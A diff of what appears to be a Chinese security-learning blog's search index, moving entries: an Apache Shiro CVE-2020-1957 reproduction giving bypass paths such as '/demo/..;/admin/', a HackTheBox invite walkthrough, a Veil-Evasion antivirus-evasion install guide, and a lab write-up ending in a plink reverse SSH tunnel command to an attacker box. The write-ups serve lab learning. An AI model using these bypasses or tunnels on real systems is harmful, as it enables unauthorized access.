@@ -98,6 +98,38 @@
       </tags>
   </entry>
   <entry>
+    <title>CVE-2020-1957</title>
+    <url>/2021/06/06/CVE-2020-1957/</url>
+    <content><![CDATA[<h2 id="（CVE-2020-1957）Apache-Shiro-身份认证绕过漏洞"><a href="#（CVE-2020-1957）Apache-Shiro-身份认证绕过漏洞" class="headerlink" title="（CVE-2020-1957）Apache Shiro 身份认证绕过漏洞"></a>（CVE-2020-1957）Apache Shiro 身份认证绕过漏洞</h2><hr>
+<h2 id="0x01-漏洞简述"><a href="#0x01-漏洞简述" class="headerlink" title="0x01.漏洞简述"></a>0x01.漏洞简述</h2><p>Apache Shiro 1.5.2之前版本中存在安全漏洞。攻击者可借助特制的请求利用该漏洞绕过身份验证。</p>
+<a id="more"></a>
+
+<h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02.影响版本"></a>0x02.影响版本</h2><p>Apache Shiro &lt; v1.5.2</p>
+<h2 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03.漏洞分析"></a>0x03.漏洞分析</h2><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzgwNTQ5L2FydGljbGUvZGV0YWlscy8xMDcwMzE3NDY/b3BzX3JlcXVlc3RfbWlzYz0lMjU3QiUyNTIycmVxdWVzdCUyNTVGaWQlMjUyMiUyNTNBJTI1MjIxNjIyOTg1OTkzMTY3ODAyNTUyNzgxNDclMjUyMiUyNTJDJTI1MjJzY20lMjUyMiUyNTNBJTI1MjIyMDE0MDcxMy4xMzAxMDIzMzQucGMlMjU1RmJsb2cuJTI1MjIlMjU3RCZyZXF1ZXN0X2lkPTE2MjI5ODU5OTMxNjc4MDI1NTI3ODE0NyZiaXpfaWQ9MCZ1dG1fbWVkaXVtPWRpc3RyaWJ1dGUucGNfc2VhcmNoX3Jlc3VsdC5ub25lLXRhc2stYmxvZy0yfmJsb2d+Zmlyc3RfcmFua192Mn5yYW5rX3YyOS0zLTEwNzAzMTc0Ni5ub25lY2FzZSZ1dG1fdGVybT1DVkUtMjAyMC0xOTU3JnNwbT0xMDE4LjIyMjYuMzAwMS40NDUw">轮子轮子<i class="fa fa-external-link-alt"></i></span></p>
+<h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03.漏洞复现"></a>0x03.漏洞复现</h2><p><strong>环境搭建</strong></p>
+<p><span class="exturl" data-url="aHR0cHM6Ly92dWxodWIub3JnLw==">vulhub<i class="fa fa-external-link-alt"></i></span></p>
+<p>admin认证绕过</p>
+<p>直接访问/admin，跳转到登入页面</p>
+<img src="/2021/06/06/CVE-2020-1957/CVE-2020-1957_08.png" class>
+
+<p>绕过：/demo/..;/admin/  或   /demo;/../admin/</p>
+<img src="/2021/06/06/CVE-2020-1957/CVE-2020-1957_09.png" class>
+
+<img src="/2021/06/06/CVE-2020-1957/CVE-2020-1957_10.png" class>
+
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+        <category>CVE</category>
+        <category>Shiro</category>
+      </categories>
+      <tags>
+        <tag>CVE</tag>
+        <tag>调教</tag>
+        <tag>Shiro</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CVE-2019-0230复现</title>
     <url>/2020/12/19/CVE-2019-0230/</url>
     <content><![CDATA[<h2 id="CVE-2019-0230-S2-059"><a href="#CVE-2019-0230-S2-059" class="headerlink" title="CVE-2019-0230(S2-059)"></a>CVE-2019-0230(S2-059)</h2><hr>
@@ -168,38 +200,6 @@
         <tag>CVE</tag>
         <tag>调教</tag>
         <tag>Strust2</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CVE-2020-1957</title>
-    <url>/2021/06/06/CVE-2020-1957/</url>
-    <content><![CDATA[<h2 id="（CVE-2020-1957）Apache-Shiro-身份认证绕过漏洞"><a href="#（CVE-2020-1957）Apache-Shiro-身份认证绕过漏洞" class="headerlink" title="（CVE-2020-1957）Apache Shiro 身份认证绕过漏洞"></a>（CVE-2020-1957）Apache Shiro 身份认证绕过漏洞</h2><hr>
-<h2 id="0x01-漏洞简述"><a href="#0x01-漏洞简述" class="headerlink" title="0x01.漏洞简述"></a>0x01.漏洞简述</h2><p>Apache Shiro 1.5.2之前版本中存在安全漏洞。攻击者可借助特制的请求利用该漏洞绕过身份验证。</p>
-<a id="more"></a>
-
-<h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02.影响版本"></a>0x02.影响版本</h2><p>Apache Shiro &lt; v1.5.2</p>
-<h2 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03.漏洞分析"></a>0x03.漏洞分析</h2><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMzgwNTQ5L2FydGljbGUvZGV0YWlscy8xMDcwMzE3NDY/b3BzX3JlcXVlc3RfbWlzYz0lMjU3QiUyNTIycmVxdWVzdCUyNTVGaWQlMjUyMiUyNTNBJTI1MjIxNjIyOTg1OTkzMTY3ODAyNTUyNzgxNDclMjUyMiUyNTJDJTI1MjJzY20lMjUyMiUyNTNBJTI1MjIyMDE0MDcxMy4xMzAxMDIzMzQucGMlMjU1RmJsb2cuJTI1MjIlMjU3RCZyZXF1ZXN0X2lkPTE2MjI5ODU5OTMxNjc4MDI1NTI3ODE0NyZiaXpfaWQ9MCZ1dG1fbWVkaXVtPWRpc3RyaWJ1dGUucGNfc2VhcmNoX3Jlc3VsdC5ub25lLXRhc2stYmxvZy0yfmJsb2d+Zmlyc3RfcmFua192Mn5yYW5rX3YyOS0zLTEwNzAzMTc0Ni5ub25lY2FzZSZ1dG1fdGVybT1DVkUtMjAyMC0xOTU3JnNwbT0xMDE4LjIyMjYuMzAwMS40NDUw">轮子轮子<i class="fa fa-external-link-alt"></i></span></p>
-<h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03.漏洞复现"></a>0x03.漏洞复现</h2><p><strong>环境搭建</strong></p>
-<p><span class="exturl" data-url="aHR0cHM6Ly92dWxodWIub3JnLw==">vulhub<i class="fa fa-external-link-alt"></i></span></p>
-<p>admin认证绕过</p>
-<p>直接访问/admin，跳转到登入页面</p>
-<img src="/2021/06/06/CVE-2020-1957/CVE-2020-1957_08.png" class>
-
-<p>绕过：/demo/..;/admin/  或   /demo;/../admin/</p>
-<img src="/2021/06/06/CVE-2020-1957/CVE-2020-1957_09.png" class>
-
-<img src="/2021/06/06/CVE-2020-1957/CVE-2020-1957_10.png" class>
-
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-        <category>CVE</category>
-        <category>Shiro</category>
-      </categories>
-      <tags>
-        <tag>CVE</tag>
-        <tag>调教</tag>
-        <tag>Shiro</tag>
       </tags>
   </entry>
   <entry>
@@ -1139,6 +1139,52 @@
       </tags>
   </entry>
   <entry>
+    <title>HackTheBox注册</title>
+    <url>/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/</url>
+    <content><![CDATA[<h2 id="0x00-前言-什么是Hack-The-Box"><a href="#0x00-前言-什么是Hack-The-Box" class="headerlink" title="0x00.前言~什么是Hack The Box"></a>0x00.前言~什么是Hack The Box</h2><blockquote>
+<p>它基本上是一个在线平台，用于测试和增强你的渗透测试和网络安全技能。它包含一些不断更新的挑战。其中一些模拟了现实世界的场景，而另一些则更倾向于CTF的挑战风格。如果你对网络安全或信息安全感兴趣，则应尝试此站点。OK让我们开始吧！！！</p>
+</blockquote>
+<a id="more"></a>
+
+<h2 id="0x01-首先，访问Hack-the-Box网站，并阅读其常见问题解答和一些其他有用的东西。"><a href="#0x01-首先，访问Hack-the-Box网站，并阅读其常见问题解答和一些其他有用的东西。" class="headerlink" title="0x01.首先，访问Hack the Box网站，并阅读其常见问题解答和一些其他有用的东西。"></a>0x01.首先，访问<span class="exturl" data-url="aHR0cHM6Ly93d3cuaGFja3RoZWJveC5ldS8=">Hack the Box网站，<i class="fa fa-external-link-alt"></i></span>并阅读其常见问题解答和一些其他有用的东西。</h2><h2 id="0x02-系统将提示您转到https-www-hackthebox-eu-邀请加入HTB。"><a href="#0x02-系统将提示您转到https-www-hackthebox-eu-邀请加入HTB。" class="headerlink" title="0x02.系统将提示您转到https://www.hackthebox.eu/邀请加入HTB。"></a>0x02.系统将提示您转到<span class="exturl" data-url="aHR0cHM6Ly93d3cuaGFja3RoZWJveC5ldS9pbnZpdGU=">https://www.hackthebox.eu/<i class="fa fa-external-link-alt"></i></span>邀请加入HTB。</h2><h2 id="0x03-当您转到该页面时，将看到一个文本框，让你输入邀请码。"><a href="#0x03-当您转到该页面时，将看到一个文本框，让你输入邀请码。" class="headerlink" title="0x03.当您转到该页面时，将看到一个文本框，让你输入邀请码。"></a>0x03.当您转到该页面时，将看到一个文本框，让你输入<em>邀请码</em>。</h2><h3 id="01-根据提示打开控制台"><a href="#01-根据提示打开控制台" class="headerlink" title="01.根据提示打开控制台"></a>01.根据提示打开控制台</h3><img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819155151668.png" class>
+
+<h3 id="02-根据提示继续"><a href="#02-根据提示继续" class="headerlink" title="02.根据提示继续"></a>02.根据提示继续</h3><p><code>挑战第一步，此页面加载一个有趣的javascript文件。看看你能不能找到它：</code></p>
+<img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819155456002.png" class>
+
+<h3 id="03-发现邀请接口的js文件"><a href="#03-发现邀请接口的js文件" class="headerlink" title="03.发现邀请接口的js文件"></a>03.发现邀请接口的js文件</h3><img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819155754688.png" class>
+
+<h3 id="04-右键打开，发现制造邀请码函数"><a href="#04-右键打开，发现制造邀请码函数" class="headerlink" title="04.右键打开，发现制造邀请码函数"></a>04.右键打开，发现制造邀请码函数</h3><img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819155903977.png" class>
+
+<h3 id="05-在控制台调用"><a href="#05-在控制台调用" class="headerlink" title="05.在控制台调用"></a>05.在控制台调用</h3><p><code>可以看到200状态码，可以看到data为加密为ROT13(有时也为base64)</code></p>
+<img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819160416212.png" class>
+
+<h3 id="06-解密"><a href="#06-解密" class="headerlink" title="06.解密"></a>06.解密</h3><p><code>发现要发送POST请求</code></p>
+<img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819160919218.png" class>
+
+<h3 id="07-发送POST请求"><a href="#07-发送POST请求" class="headerlink" title="07.发送POST请求"></a>07.发送POST请求</h3><p><code>得到以=结尾的数据，猜测为base64</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SlpYQkMtRkVBWUktWkhWQ1AtRkhTU0gtS0xEVFQ=</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819161940343.png" class>
+
+<h3 id="08-解码"><a href="#08-解码" class="headerlink" title="08.解码"></a>08.解码</h3><p><code>得到邀请码</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">JZXBC-FEAYI-ZHVCP-FHSSH-KLDTT</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819162456042.png" class>
+
+<h3 id="09-之后就可以愉快的玩耍了"><a href="#09-之后就可以愉快的玩耍了" class="headerlink" title="09.之后就可以愉快的玩耍了"></a>09.之后就可以愉快的玩耍了</h3><p><code>根据提示进行连接即可</code></p>
+<img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819195715615.png" class>
+
+<p><code>下图为连接成功状态</code></p>
+<img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819195817627.png" class>
+]]></content>
+      <categories>
+        <category>HackTheBox</category>
+      </categories>
+      <tags>
+        <tag>靶机</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Sqli_labs_Page3(stacked)</title>
     <url>/2021/02/02/Sqli-labs-Page3-stack/</url>
     <content><![CDATA[<p><strong>Sqli_labs_Page3(stacked)</strong></p>
@@ -1278,52 +1324,6 @@
       </tags>
   </entry>
   <entry>
-    <title>HackTheBox注册</title>
-    <url>/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/</url>
-    <content><![CDATA[<h2 id="0x00-前言-什么是Hack-The-Box"><a href="#0x00-前言-什么是Hack-The-Box" class="headerlink" title="0x00.前言~什么是Hack The Box"></a>0x00.前言~什么是Hack The Box</h2><blockquote>
-<p>它基本上是一个在线平台，用于测试和增强你的渗透测试和网络安全技能。它包含一些不断更新的挑战。其中一些模拟了现实世界的场景，而另一些则更倾向于CTF的挑战风格。如果你对网络安全或信息安全感兴趣，则应尝试此站点。OK让我们开始吧！！！</p>
-</blockquote>
-<a id="more"></a>
-
-<h2 id="0x01-首先，访问Hack-the-Box网站，并阅读其常见问题解答和一些其他有用的东西。"><a href="#0x01-首先，访问Hack-the-Box网站，并阅读其常见问题解答和一些其他有用的东西。" class="headerlink" title="0x01.首先，访问Hack the Box网站，并阅读其常见问题解答和一些其他有用的东西。"></a>0x01.首先，访问<span class="exturl" data-url="aHR0cHM6Ly93d3cuaGFja3RoZWJveC5ldS8=">Hack the Box网站，<i class="fa fa-external-link-alt"></i></span>并阅读其常见问题解答和一些其他有用的东西。</h2><h2 id="0x02-系统将提示您转到https-www-hackthebox-eu-邀请加入HTB。"><a href="#0x02-系统将提示您转到https-www-hackthebox-eu-邀请加入HTB。" class="headerlink" title="0x02.系统将提示您转到https://www.hackthebox.eu/邀请加入HTB。"></a>0x02.系统将提示您转到<span class="exturl" data-url="aHR0cHM6Ly93d3cuaGFja3RoZWJveC5ldS9pbnZpdGU=">https://www.hackthebox.eu/<i class="fa fa-external-link-alt"></i></span>邀请加入HTB。</h2><h2 id="0x03-当您转到该页面时，将看到一个文本框，让你输入邀请码。"><a href="#0x03-当您转到该页面时，将看到一个文本框，让你输入邀请码。" class="headerlink" title="0x03.当您转到该页面时，将看到一个文本框，让你输入邀请码。"></a>0x03.当您转到该页面时，将看到一个文本框，让你输入<em>邀请码</em>。</h2><h3 id="01-根据提示打开控制台"><a href="#01-根据提示打开控制台" class="headerlink" title="01.根据提示打开控制台"></a>01.根据提示打开控制台</h3><img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819155151668.png" class>
-
-<h3 id="02-根据提示继续"><a href="#02-根据提示继续" class="headerlink" title="02.根据提示继续"></a>02.根据提示继续</h3><p><code>挑战第一步，此页面加载一个有趣的javascript文件。看看你能不能找到它：</code></p>
-<img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819155456002.png" class>
-
-<h3 id="03-发现邀请接口的js文件"><a href="#03-发现邀请接口的js文件" class="headerlink" title="03.发现邀请接口的js文件"></a>03.发现邀请接口的js文件</h3><img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819155754688.png" class>
-
-<h3 id="04-右键打开，发现制造邀请码函数"><a href="#04-右键打开，发现制造邀请码函数" class="headerlink" title="04.右键打开，发现制造邀请码函数"></a>04.右键打开，发现制造邀请码函数</h3><img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819155903977.png" class>
-
-<h3 id="05-在控制台调用"><a href="#05-在控制台调用" class="headerlink" title="05.在控制台调用"></a>05.在控制台调用</h3><p><code>可以看到200状态码，可以看到data为加密为ROT13(有时也为base64)</code></p>
-<img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819160416212.png" class>
-
-<h3 id="06-解密"><a href="#06-解密" class="headerlink" title="06.解密"></a>06.解密</h3><p><code>发现要发送POST请求</code></p>
-<img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819160919218.png" class>
-
-<h3 id="07-发送POST请求"><a href="#07-发送POST请求" class="headerlink" title="07.发送POST请求"></a>07.发送POST请求</h3><p><code>得到以=结尾的数据，猜测为base64</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SlpYQkMtRkVBWUktWkhWQ1AtRkhTU0gtS0xEVFQ=</span><br></pre></td></tr></table></figure>
-
-<img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819161940343.png" class>
-
-<h3 id="08-解码"><a href="#08-解码" class="headerlink" title="08.解码"></a>08.解码</h3><p><code>得到邀请码</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">JZXBC-FEAYI-ZHVCP-FHSSH-KLDTT</span><br></pre></td></tr></table></figure>
-
-<img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819162456042.png" class>
-
-<h3 id="09-之后就可以愉快的玩耍了"><a href="#09-之后就可以愉快的玩耍了" class="headerlink" title="09.之后就可以愉快的玩耍了"></a>09.之后就可以愉快的玩耍了</h3><p><code>根据提示进行连接即可</code></p>
-<img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819195715615.png" class>
-
-<p><code>下图为连接成功状态</code></p>
-<img src="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/image-20200819195817627.png" class>
-]]></content>
-      <categories>
-        <category>HackTheBox</category>
-      </categories>
-      <tags>
-        <tag>靶机</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>kali设置酸酸乳</title>
     <url>/2020/08/16/kali%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86/</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
@@ -1455,51 +1455,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Veil-Evasion安装</title>
-    <url>/2020/08/18/veil-evasion%E5%AE%89%E8%A3%85/</url>
-    <content><![CDATA[<h2 id="Veil-Evasion简介"><a href="#Veil-Evasion简介" class="headerlink" title="Veil-Evasion简介"></a><span class="exturl" data-url="aHR0cHM6Ly93d3cudmVpbC1mcmFtZXdvcmsuY29tLw==">Veil-Evasion<i class="fa fa-external-link-alt"></i></span>简介</h2><blockquote>
-<p>Veil-Evasion是一种免杀工具，用于生成绕过常见AV的metasploit payload。</p>
-<p>Veil-Evasion被原生设计在kali上，,但kali2020已经需要独立安装。其实存在python环境的系统上应该都能运行。你可以用命令行轻松调用Veil-Evasion，按菜单选项生成payload。在创建payload的时候，Veil-Evasion会询问你是否想把<strong>payload文件用Pyinstaller或者Py2Exe转为可执行文件。</strong></p>
-</blockquote>
-<p><strong>免责声明：本文只为学习记录，任何人非法使用产生的任何后果，作者概不负责！！！</strong></p>
-<a id="more"></a>
-
-<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="首先更新系统，本次系统为2020-3"><a href="#首先更新系统，本次系统为2020-3" class="headerlink" title="首先更新系统，本次系统为2020.3"></a>首先更新系统，本次系统为2020.3</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get update        //更新所有软件包的列表</span><br><span class="line">apt-get upgrade        //更新所有软件</span><br></pre></td></tr></table></figure>
-
-<h3 id="查看系统详情"><a href="#查看系统详情" class="headerlink" title="查看系统详情"></a>查看系统详情</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># lsb_release -a</span></span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID: Kali</span><br><span class="line">Description:    Kali GNU/Linux Rolling</span><br><span class="line">Release:        2020.3</span><br><span class="line">Codename:       kali-rolling</span><br><span class="line">root@JIYE:~<span class="comment"># </span></span><br></pre></td></tr></table></figure>
-
-<h3 id="配置clone加速，需要配置代理。"><a href="#配置clone加速，需要配置代理。" class="headerlink" title="配置clone加速，需要配置代理。"></a>配置clone加速，需要配置代理。</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global http.proxy <span class="string">&#x27;socks5://127.0.0.1:1080&#x27;</span> </span><br><span class="line">git config --global https.proxy <span class="string">&#x27;socks5://127.0.0.1:1080&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="安装veil"><a href="#安装veil" class="headerlink" title="安装veil"></a>安装veil</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install veil-evasion</span><br><span class="line">veil</span><br></pre></td></tr></table></figure>
-
-<p><code>由于需要运行windows下的程序，所以需要安装windows系统下的程序</code></p>
-<p><strong><code>默认安装即可</code></strong></p>
-<img src="/2020/08/18/veil-evasion%E5%AE%89%E8%A3%85/image-20200814203354313.png" class>
-
-<img src="/2020/08/18/veil-evasion%E5%AE%89%E8%A3%85/image-20200814203452010.png" class>
-
-<p><strong><code>其他安装略</code></strong></p>
-<h3 id="安装可能会出现错误（我的错误如下），执行以下操作"><a href="#安装可能会出现错误（我的错误如下），执行以下操作" class="headerlink" title="安装可能会出现错误（我的错误如下），执行以下操作"></a><strong>安装可能会出现错误（我的错误如下），执行以下操作</strong></h3><blockquote>
-<p><strong>错误如下，按提示执行命令即可</strong></p>
-<p>[I] If you have any errors running Veil, run: <strong>‘./Veil.py –setup’</strong> and select the nuke the wine folder option</p>
-<p>[I] Done!</p>
-<p>[!] ERROR #2-3: Can’t find the WINE profile for AuotIT v3 (/var/lib/veil/wine//drive_c/Program Files/AutoIt3/Aut2Exe/Aut2exe.exe).   Run:<strong>/usr/share/veil/config/setup.sh –force –silent</strong></p>
-<p>root@JIYE:~# Could not find Wine Gecko. HTML rendering will be disabled.<br>004a:err:mshtml:create_document_object Failed to init Gecko, returning CLASS_E_CLASSNOTAVAILABLE</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/share/veil/ &amp;&amp;./Veil.py --<span class="built_in">set</span> up</span><br><span class="line">/usr/share/veil/config/setup.sh --force --silent</span><br></pre></td></tr></table></figure>
-
-<h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><img src="/2020/08/18/veil-evasion%E5%AE%89%E8%A3%85/image-20200815151937202.png" class>
-
-<h2 id="日后再写使用方式。。。佛系佛系"><a href="#日后再写使用方式。。。佛系佛系" class="headerlink" title="日后再写使用方式。。。佛系佛系"></a>日后再写使用方式。。。佛系佛系</h2>]]></content>
-      <categories>
-        <category>kali</category>
-      </categories>
-      <tags>
-        <tag>security tools</tag>
-        <tag>linux</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>tryhackme-[blue]</title>
     <url>/2021/01/15/tryhackme-blue/</url>
     <content><![CDATA[<h2 id="0x01-Demo"><a href="#0x01-Demo" class="headerlink" title="0x01.Demo"></a>0x01.Demo</h2><img src="/2021/01/15/tryhackme-blue/image-20210115194912000.png" class>
@@ -1586,6 +1541,51 @@
       </categories>
       <tags>
         <tag>靶机</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Veil-Evasion安装</title>
+    <url>/2020/08/18/veil-evasion%E5%AE%89%E8%A3%85/</url>
+    <content><![CDATA[<h2 id="Veil-Evasion简介"><a href="#Veil-Evasion简介" class="headerlink" title="Veil-Evasion简介"></a><span class="exturl" data-url="aHR0cHM6Ly93d3cudmVpbC1mcmFtZXdvcmsuY29tLw==">Veil-Evasion<i class="fa fa-external-link-alt"></i></span>简介</h2><blockquote>
+<p>Veil-Evasion是一种免杀工具，用于生成绕过常见AV的metasploit payload。</p>
+<p>Veil-Evasion被原生设计在kali上，,但kali2020已经需要独立安装。其实存在python环境的系统上应该都能运行。你可以用命令行轻松调用Veil-Evasion，按菜单选项生成payload。在创建payload的时候，Veil-Evasion会询问你是否想把<strong>payload文件用Pyinstaller或者Py2Exe转为可执行文件。</strong></p>
+</blockquote>
+<p><strong>免责声明：本文只为学习记录，任何人非法使用产生的任何后果，作者概不负责！！！</strong></p>
+<a id="more"></a>
+
+<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="首先更新系统，本次系统为2020-3"><a href="#首先更新系统，本次系统为2020-3" class="headerlink" title="首先更新系统，本次系统为2020.3"></a>首先更新系统，本次系统为2020.3</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get update        //更新所有软件包的列表</span><br><span class="line">apt-get upgrade        //更新所有软件</span><br></pre></td></tr></table></figure>
+
+<h3 id="查看系统详情"><a href="#查看系统详情" class="headerlink" title="查看系统详情"></a>查看系统详情</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># lsb_release -a</span></span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID: Kali</span><br><span class="line">Description:    Kali GNU/Linux Rolling</span><br><span class="line">Release:        2020.3</span><br><span class="line">Codename:       kali-rolling</span><br><span class="line">root@JIYE:~<span class="comment"># </span></span><br></pre></td></tr></table></figure>
+
+<h3 id="配置clone加速，需要配置代理。"><a href="#配置clone加速，需要配置代理。" class="headerlink" title="配置clone加速，需要配置代理。"></a>配置clone加速，需要配置代理。</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global http.proxy <span class="string">&#x27;socks5://127.0.0.1:1080&#x27;</span> </span><br><span class="line">git config --global https.proxy <span class="string">&#x27;socks5://127.0.0.1:1080&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="安装veil"><a href="#安装veil" class="headerlink" title="安装veil"></a>安装veil</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install veil-evasion</span><br><span class="line">veil</span><br></pre></td></tr></table></figure>
+
+<p><code>由于需要运行windows下的程序，所以需要安装windows系统下的程序</code></p>
+<p><strong><code>默认安装即可</code></strong></p>
+<img src="/2020/08/18/veil-evasion%E5%AE%89%E8%A3%85/image-20200814203354313.png" class>
+
+<img src="/2020/08/18/veil-evasion%E5%AE%89%E8%A3%85/image-20200814203452010.png" class>
+
+<p><strong><code>其他安装略</code></strong></p>
+<h3 id="安装可能会出现错误（我的错误如下），执行以下操作"><a href="#安装可能会出现错误（我的错误如下），执行以下操作" class="headerlink" title="安装可能会出现错误（我的错误如下），执行以下操作"></a><strong>安装可能会出现错误（我的错误如下），执行以下操作</strong></h3><blockquote>
+<p><strong>错误如下，按提示执行命令即可</strong></p>
+<p>[I] If you have any errors running Veil, run: <strong>‘./Veil.py –setup’</strong> and select the nuke the wine folder option</p>
+<p>[I] Done!</p>
+<p>[!] ERROR #2-3: Can’t find the WINE profile for AuotIT v3 (/var/lib/veil/wine//drive_c/Program Files/AutoIt3/Aut2Exe/Aut2exe.exe).   Run:<strong>/usr/share/veil/config/setup.sh –force –silent</strong></p>
+<p>root@JIYE:~# Could not find Wine Gecko. HTML rendering will be disabled.<br>004a:err:mshtml:create_document_object Failed to init Gecko, returning CLASS_E_CLASSNOTAVAILABLE</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/share/veil/ &amp;&amp;./Veil.py --<span class="built_in">set</span> up</span><br><span class="line">/usr/share/veil/config/setup.sh --force --silent</span><br></pre></td></tr></table></figure>
+
+<h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><img src="/2020/08/18/veil-evasion%E5%AE%89%E8%A3%85/image-20200815151937202.png" class>
+
+<h2 id="日后再写使用方式。。。佛系佛系"><a href="#日后再写使用方式。。。佛系佛系" class="headerlink" title="日后再写使用方式。。。佛系佛系"></a>日后再写使用方式。。。佛系佛系</h2>]]></content>
+      <categories>
+        <category>kali</category>
+      </categories>
+      <tags>
+        <tag>security tools</tag>
+        <tag>linux</tag>
       </tags>
   </entry>
   <entry>
@@ -2433,7 +2433,7 @@
 <blockquote>
 <p>报错为：无法同意密钥交换算法</p>
 <p>Google一下发现需要更新putty，但是更新后还是不好使。。。菜狗一脸茫然！</p>
-<p>C:\xampp\htdocs\gym\upload&gt;plink.exe -v -x -a -T -C -noagent -ssh -pw “root” -R 8888:127.0.0.1:8888 <span class="exturl" data-url="bWFpbHRvOiYjMTE0OyYjMTExOyYjeDZmOyYjeDc0OyYjNjQ7JiM0OTsmI3gzMDsmIzQ2OyYjNDk7JiN4MzA7JiN4MmU7JiM0OTsmIzU1OyYjNDY7JiM1MDsmI3gzMTsmIzU0Ow==">&#114;&#111;&#x6f;&#x74;&#64;&#49;&#x30;&#46;&#49;&#x30;&#x2e;&#49;&#55;&#46;&#50;&#x31;&#54;<i class="fa fa-external-link-alt"></i></span><br>plink.exe -v -x -a -T -C -noagent -ssh -pw “root” -R 8888:127.0.0.1:8888 <span class="exturl" data-url="bWFpbHRvOiYjeDcyOyYjeDZmOyYjeDZmOyYjMTE2OyYjeDQwOyYjNDk7JiN4MzA7JiM0NjsmI3gzMTsmIzQ4OyYjeDJlOyYjeDMxOyYjNTU7JiM0NjsmI3gzMjsmI3gzMTsmI3gzNjs=">&#x72;&#x6f;&#x6f;&#116;&#x40;&#49;&#x30;&#46;&#x31;&#48;&#x2e;&#x31;&#55;&#46;&#x32;&#x31;&#x36;<i class="fa fa-external-link-alt"></i></span><br>Looking up host “10.10.17.216”<br>Connecting to 10.10.17.216 port 22<br>Server version: SSH-2.0-OpenSSH_8.3p1 Debian-1<br>Using SSH protocol version 2<br>We claim version: SSH-2.0-PuTTY_Release_0.63<br>Couldn’t agree a key exchange algorithm (available: curve25519-sha256,<span class="exturl" 